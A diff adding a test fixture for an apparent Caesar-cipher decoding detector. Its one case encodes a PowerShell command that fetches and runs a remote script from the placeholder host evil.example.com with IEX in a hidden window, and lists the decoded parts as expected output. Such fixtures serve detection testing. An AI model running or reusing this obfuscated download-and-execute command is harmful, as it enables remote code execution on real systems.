@@ -1,0 +1,2 @@
+# caesar-decode · Golden Fixtures · RC3.2a
+{"case_id": "caesar-shift-7", "description": "Caesar +7 \u2192 PowerShell IEX", "input": "wvdlyzolss.lel -uvw -j \"PLE 'oaaw://lcps.lehtwsl.jvt/e.wz1'\"", "detect_min_confidence": 0.3, "expected_output_contains": ["powershell.exe", "IEX", "http://evil.example.com/x.ps1"]}
